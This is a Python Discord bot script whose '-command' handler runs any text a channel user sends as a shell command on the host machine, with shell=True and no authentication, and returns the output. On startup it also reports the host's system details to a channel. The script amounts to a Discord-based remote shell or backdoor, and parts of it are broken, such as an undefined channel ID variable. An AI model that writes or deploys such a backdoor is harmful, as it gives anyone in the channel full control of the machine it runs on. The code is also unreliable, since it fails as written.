import discord
from discord.ext import commands
import subprocess
import platform
import hashlib
import sys

# Check and install required dependencies
try:
    import discord
except ImportError:
    print("discord.py library not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])

# Set your bot token here
TOKEN = 'your_bot_token'

# Create an instance of the bot
bot = commands.Bot(command_prefix='-')

# Define a command to execute system commands
@bot.command(name='command')
async def execute_command(ctx, *, command):
    try:
        # Execute the system command
        result = subprocess.check_output(command, shell=True, text=True)
        await ctx.send(f'Command executed successfully:\n```\n{result}\n```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Error executing command:\n```\n{e}\n```')

# Define a command to get system information and generate a hash
@bot.command(name='systeminfo')
async def system_info(ctx):
    system_info = f"System: {platform.system()} {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}"

    # Generate a hash of the system information
    hash_object = hashlib.md5(system_info.encode())
    system_hash = hash_object.hexdigest()

    await ctx.send(f"System Information:\n```\n{system_info}\n```\nSystem Hash: {system_hash}")

# Event handler when the bot is ready
@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

    # Send system information on bot start
    channel = bot.get_channel(your_channel_id)  # Replace your_channel_id with the actual channel ID
    if channel:
        await channel.send("Bot is online!\n")
        await system_info(channel)

# Run the bot with the token
bot.run(TOKEN)
